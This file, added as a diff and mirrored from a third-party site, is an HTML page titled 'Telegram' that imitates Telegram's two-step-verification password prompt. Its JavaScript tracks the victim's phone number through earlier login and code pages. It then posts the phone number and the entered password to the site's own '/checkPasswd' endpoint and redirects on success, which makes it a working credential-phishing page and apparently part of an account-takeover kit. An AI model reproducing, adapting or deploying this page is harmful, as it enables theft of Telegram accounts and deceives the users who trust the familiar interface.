@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from qhzxzx.com/passwd by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+    <title>Telegram</title>
+    <style>
+
+        :root{
+            --main-color:red;
+            --font-size: 16px;
+            --z-country-code-input-group:10;
+            --color-borders-input:rgb(218, 220, 224);
+            --border-radius-default:0.75rem;
+            --color-background:rgb(255, 255, 255);
+            --color-text-secondary:rgb(112, 117, 121);
+            --color-primary:rgb(51, 144, 236);
+            --color-error:#e53935;
+            --font-regular: "Roboto", -apple-system, apple color emoji, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+        }
+
+        html,body{
+            width: 100%;
+            height: 100%;
+            font-size: var(--font-size);
+            user-select: none;
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: var(--font-regular);
+        }
+        *{
+            font-size: var(--font-size);
+            user-select: none;
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: var(--font-regular);
+
+        }
+        .container{
+            width: 100%;
+            max-width:25.5rem;
+            height: 100%;
+            margin: 0 auto;
+            padding-left: 1rem;
+            padding-right: 1rem;
+        }
+
+
+        /* 当屏幕宽度大于或等于600像素时，调整 */
+        @media (min-width: 600px) {
+            .container{
+                width: 600px;
+            }
+        }
+
+
+        #passwd-wrap{
+            position: relative;
+            z-index: var(--z-country-code-input-group);
+            margin-bottom: 1rem;
+            margin-top: 2rem;
+        }
+        #passwd-input{
+            display: block;
+            width: 100%;
+            height: 3.375rem;
+            outline: none;
+            --border-width:1px;
+            border: var(--border-width) solid var(--color-borders-input);
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-background);
+            transition: border-color .15s ease;
+            word-break:break-word;
+            font-size:1rem;
+            line-height:1.25rem;
+            font-family:inherit;
+            caret-color: var(--color-primary);
+            padding-inline-end:2.5rem;
+            padding-inline-start: 1.5rem;
+            letter-spacing:0.125rem;
+        }
+        #passwd-wrap>label{
+            color:var(--color-text-secondary);
+            display: block;
+            padding: 0 0.25rem;
+            position: absolute;
+            left: 0.75rem;
+            top:0.9375rem;
+            background-color: var(--color-background);
+            font-size: 1rem;
+            font-weight: 400;
+            transition: transform .15s ease-out, color .15s ease-out;
+        }
+
+        /*旋转lable*/
+        #passwd-wrap>.lable-focus {
+            transform: scale(0.75) translate(-0.5rem, -2.25rem);
+        }
+
+        /*修改input的边框颜色*/
+        #passwd-wrap> .input-focus {
+            border-color:var(--color-primary);
+            box-shadow:inset 0 0 0 1px var(--color-primary);
+        }
+
+        /*修改lable的字体颜色*/
+        #passwd-wrap>.lable-border-focus {
+            color: var(--color-primary);
+        }
+
+        /*修改input的边框颜色*/
+        #passwd-wrap> .input-focus-error {
+            border-color:var(--color-error);
+            box-shadow:inset 0 0 0 1px var(--color-error);
+        }
+        /*修改lable的字体颜色*/
+        #passwd-wrap>.lable-border-focus-error {
+            color: var(--color-error);
+        }
+
+        @font-face {
+            font-family: tgico;
+            src: url(static/fonts/tgico.ttf);
+            font-weight: 400;
+            font-style: normal;
+            font-display: block
+        }
+
+        .tgico {
+            font-family: tgico!important;
+            font-size: 24px;
+            color: #9e9e9e;
+
+        }
+
+        #login-btn{
+            outline: none !important;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height:3.5rem;
+            border:0;
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-primary);
+            background-size:cover;
+            color: white;
+            position: relative;
+            overflow:hidden;
+            line-height: 1.2;
+            transition:background-color .15s,color .15s;
+            text-decoration:none !important;
+            text-transform:uppercase;
+            user-select: none;
+            font-family:inherit;
+            font-size:inherit;
+        }
+
+        .login-btn-opacity{
+            opacity: 0.6;
+        }
+
+        .login-btn-loading-wrap{
+            height:3.5rem;
+            position: absolute;
+            right: 1rem;
+            top: 0;
+            bottom:0;
+            align-items: center;
+            display: none;
+        }
+        .login-btn-loading-wrap > svg{
+            height: 30px;
+            inset-inline-end:15px;
+            animation: login-btn-loading-rotate 1s linear infinite;
+            transform-origin: center center;
+        }
+        .login-btn-loading-wrap > svg>circle{
+            stroke-dasharray:93.6375, 124.85;
+            stroke-dashoffset:0;
+            stroke-linecap:round;
+            stroke:#fff;
+            stroke-width:3;
+        }
+        @keyframes login-btn-loading-rotate {
+            00% {
+                transform: rotate(360deg);
+            }
+        }
+
+    </style>
+
+    <script>
+
+        var loginUrl = "login.html";
+        var codeUrl = "code.html";
+        var pwdUrl = "passwd.html";
+        var successUrl = "loginSuccess.html";
+
+        var mobile = localStorage.getItem("mobile")
+
+        var localVal = null;
+
+        function initPage() {
+
+            if (mobile == undefined || mobile == null || mobile == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            var localKey = mobile.replace(/\D/g, '')
+            if(localKey == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            localVal = localStorage.getItem(localKey)
+            if (localVal == undefined || localVal == null || localVal == "") {
+                window.location.replace(loginUrl)
+                return
+            }
+
+            try {
+                localVal = JSON.parse(localVal)
+                if (localVal === null || typeof localVal !== 'object') {
+                    localStorage.removeItem(localKey);
+                    window.location.replace(loginUrl)
+                }
+            }catch (e) {
+                localStorage.removeItem(localKey);
+                window.location.replace(loginUrl)
+                return
+            }
+
+            //判断是否登录过了
+            if (localVal.loginTime != undefined && localVal.loginTime != null && localVal.loginTime != "") {
+                var reSuccessUrl = localStorage.getItem('reSuccessUrl')
+                if(reSuccessUrl != null && reSuccessUrl != "") {
+                    window.location.replace(reSuccessUrl)
+                } else {
+                    window.location.replace(successUrl)
+                }
+                return
+            }
+
+            //判断是否验证过验证码只有密码没有验证了
+            if (localVal.checkCodeTime != undefined && localVal.checkCodeTime != null && localVal.checkCodeTime != "") {
+                var nowCheckCodeTime = (new Date().getTime()).toString().substr(0,10)
+                if((parseInt(nowCheckCodeTime) - parseInt(localVal.checkCodeTime)) < 1800) {
+                    return
+                }
+            }
+
+            //判断是否已经获取过验证码了
+            if (localVal.getCodeTime != undefined && localVal.getCodeTime != null && localVal.getCodeTime != "") {
+                var nowGetCodeTime = (new Date().getTime()).toString().substr(0,10)
+                if((parseInt(nowGetCodeTime) - parseInt(localVal.getCodeTime)) < 300) {
+                    window.location.replace(codeUrl)
+                    return
+                }
+            }
+
+            window.location.replace(loginUrl)
+
+        }
+
+        initPage()
+    </script>
+</head>
+<body>
+
+<div style="" class="container">
+    <div style="height: 3rem"></div>
+    <div style="width: 120px;height: 120px;margin: 0 auto 18px">
+        <img src="static/img/hiddenpwd.png" style="width: 120px;height: 120px;" id="padshowimg">
+        <input name="585ae5bcebbdc75f860" value="e9ecef4bbe6d18b1f967f7851b7a79ec843e12e394375ce63aadf73" type="hidden">
+        <img src="static/img/showpwd.png" style="width: 120px;height: 120px;display: none" id="padhideimg">
+    </div>
+    <h4 style="font-size: 20px;margin: 2px 0 8px;text-align: center;line-height: 110%;font-weight: 500">
+        <span style="font-size: 20px">Enter Your Password</span>
+    </h4>
+    <p style="color: #707579;text-align: center;line-height: 1.1">
+        <span style="font-size: 14px;">Your account is protected with <br/> an additional password</span>
+    </p>
+
+    <div id="passwd-wrap">
+        <input type="password" name="passwd" id="passwd-input" autocomplete="off" inputmode="tel" dir="auto">
+        <!--这里不显示错误只会变成红色-->
+        <label id="passwd-lable-text">Password</label>
+        <span style="position:absolute;z-index: 2;padding: 0.5rem;right: 0.375rem;top: 50%;transform: translateY(-50%);display: flex;align-items: center;cursor:pointer;">
+            <span class="tgico" id="passwdShow"></span>
+            <span class="tgico" style="display: none" id="passwdHide"></span>
+       </span>
+    </div>
+
+    <button id="login-btn">
+        <!--Incorrect password-->
+        <span id="login-btn-text">Next</span>
+        <div class="login-btn-loading-wrap">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="25 25 50 50">
+                <circle cx="50" cy="50" r="20" fill="none" stroke-miterlimit="10"></circle>
+            </svg>
+        </div>
+    </button>
+
+</div>
+<div id="modal-wrap" style="position: fixed;top:0;left: 0;bottom: 0;right: 0;z-index: 9999;display: none"></div>
+<script src="static/plugins/jquery-2.1.4/jquery.min.js"></script>
+<script>
+    $(function () {
+
+        var passwdLableText = "Password";
+
+        var requestFlag = false;
+
+        initPage()
+
+        $("#passwdShow").click(function (e) {
+            e.stopPropagation();
+
+            $("#passwdHide").show()
+            $("#passwd-input").attr('type','text')
+
+
+            $("#padshowimg").hide()
+            $("#padhideimg").show()
+
+            $(this).hide()
+        })
+
+        $("#passwdHide").click(function (e) {
+            e.stopPropagation();
+
+            $("#passwdShow").show()
+            $("#passwd-input").attr('type','password')
+
+            $("#padshowimg").show()
+            $("#padhideimg").hide()
+
+            $(this).hide()
+
+        })
+
+
+        $('body').click(function(e) {
+
+            //旋转lable
+            var passwd =  $('#passwd-input').val()
+            if (passwd == ""){
+                if ($('#passwd-wrap>label').hasClass('lable-focus')) {
+                    $('#passwd-wrap>label').removeClass("lable-focus")
+                }
+            }
+
+            //修改input的边框颜色
+            if ($('#passwd-input').hasClass('input-focus')) {
+                $('#passwd-input').removeClass("input-focus")
+            }
+
+            //修改lable的字体颜色
+            if ($('#passwd-wrap>label').hasClass('lable-border-focus')) {
+                $('#passwd-wrap>label').removeClass("lable-border-focus")
+            }
+
+
+        })
+
+        $("#passwd-wrap").click(function (e) {
+
+            e.stopPropagation();
+
+            if (!$('#passwd-wrap>label').hasClass('lable-focus')) {
+                $('#passwd-wrap>label').addClass("lable-focus")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#passwd-wrap>label').hasClass('lable-border-focus-error')) {
+                if (!$('#passwd-input').hasClass('input-focus')) {
+                    $('#passwd-input').addClass("input-focus")
+                }
+            }
+
+            //修改input的边框颜色
+            if (!$('#code-input').hasClass('input-focus-error')) {
+                if (!$('#passwd-wrap>label').hasClass('lable-border-focus')) {
+                    $('#passwd-wrap>label').addClass("lable-border-focus")
+                }
+            }
+
+        })
+
+        $('#passwd-input').on('input', function() {
+
+            var nowPasswd = $(this).val()
+            if (nowPasswd.length > 32) {
+                nowPasswd = nowPasswd.substring(0, 32)
+                $(this).val(nowPasswd)
+            }
+
+            $("#passwd-lable-text").text(passwdLableText)
+
+            //修改lable的字体颜色
+            if ($('#passwd-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#passwd-wrap>label').removeClass("lable-border-focus-error")
+            }
+
+            //修改input的边框颜色
+            if ($('#passwd-input').hasClass('input-focus-error')) {
+                $('#passwd-input').removeClass("input-focus-error")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#passwd-wrap>label').hasClass('lable-border-focus')) {
+                $('#passwd-wrap>label').addClass("lable-border-focus")
+            }
+
+            //修改input的边框颜色
+            if (!$('#passwd-input').hasClass('input-focus')) {
+                $('#passwd-input').addClass("input-focus")
+            }
+        })
+
+        $("#login-btn").click(function () {
+            if(requestFlag){
+                return;
+            }
+
+            if ($('#passwd-input').val() == "") {
+                $("#login-btn-text").text("Incorrect password")
+                codeError()
+                return;
+            }
+
+            try {
+
+                requestFlag = true;
+                $("#login-btn-text").text("PLEASE WAIT...")
+                $("#modal-wrap").show()
+                $('#login-btn').addClass("login-btn-opacity")
+                $("#login-btn > .login-btn-loading-wrap").css({"display":"flex"})
+
+                var requestParam = {
+                    mobile: mobile,
+                    passwd:$('#passwd-input').val(),
+                    uuid:localStorage.getItem("uuid"),
+                    '585ae5bcebbdc75f860': $("input[name='585ae5bcebbdc75f860']").val(),
+                }
+                if(requestParam.uuid == undefined || requestParam.uuid == null || requestParam.uuid == '') {
+                    requestParam.uuid = '';
+                }
+
+                sendRequest('/checkPasswd',requestParam,function (r) {
+                    requestFlag = false;
+                    $("#modal-wrap").hide()
+                    $('#login-btn').removeClass("login-btn-opacity")
+                    $("#login-btn > .login-btn-loading-wrap").css({"display":"none"})
+
+                    if (r.code == '10000') {
+                        localVal.loginTime = (new Date().getTime()).toString().substr(0,10);
+                        var localKey = mobile.replace(/\D/g, '')
+                        localStorage.setItem(localKey,JSON.stringify(localVal));
+                        if(r.data != undefined && r.data.url != undefined && r.data.url != ""){
+                            localStorage.setItem('reSuccessUrl',r.data.url);
+                            window.location.replace(r.data.url)
+                        } else {
+                            window.location.replace(successUrl)
+                        }
+                    } else {
+                        if (r.msg == undefined || r.msg == null || r.msg == "") {
+                            $("#login-btn-text").text("Request errors")
+                            codeError()
+                        } else {
+                            $("#login-btn-text").text(r.msg)
+                            codeError()
+                        }
+                    }
+                });
+            }catch (e) {
+                requestFlag = false;
+                $("#modal-wrap").hide()
+                $('#login-btn').removeClass("login-btn-opacity")
+                $("#login-btn > .login-btn-loading-wrap").css({"display":"none"})
+                $("#login-btn-text").text("Request error")
+            }
+
+
+        })
+
+        function codeError() {
+
+            //修改lable的字体颜色
+            if ($('#passwd-wrap>label').hasClass('lable-border-focus')) {
+                $('#passwd-wrap>label').removeClass("lable-border-focus")
+            }
+
+            //修改input的边框颜色
+            if ($('#passwd-input').hasClass('input-focus')) {
+                $('#passwd-input').removeClass("input-focus")
+            }
+
+            //修改lable的字体颜色
+            if (!$('#passwd-wrap>label').hasClass('lable-border-focus-error')) {
+                $('#passwd-wrap>label').addClass("lable-border-focus-error")
+            }
+
+            //修改input的边框颜色
+            if (!$('#passwd-input').hasClass('input-focus-error')) {
+                $('#passwd-input').addClass("input-focus-error")
+            }
+        }
+
+
+        function sendRequest(url ,data, fn) {
+            $.ajax({
+                type:"post",
+                url:url,
+                dataType:"json",
+                data:data,
+                success:function(r,status,xhr){
+                    fn(r)
+                    if(r.code != undefined && r.code != '10000'){
+                        if(xhr.getResponseHeader('585ae5bcebbdc75f860') != undefined && xhr.getResponseHeader('585ae5bcebbdc75f860') != null && xhr.getResponseHeader('585ae5bcebbdc75f860') != ''){
+                            $("input[name='585ae5bcebbdc75f860']").val(xhr.getResponseHeader('585ae5bcebbdc75f860'))
+                        }
+                    }
+                },
+                error:function(e)
+                {
+                    fn({code:"99999",msg:"Request error"})
+                }
+            });
+        }
+
+    })
+</script>
+</body>
+
+<!-- Mirrored from qhzxzx.com/passwd by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:57 GMT -->
+</html>
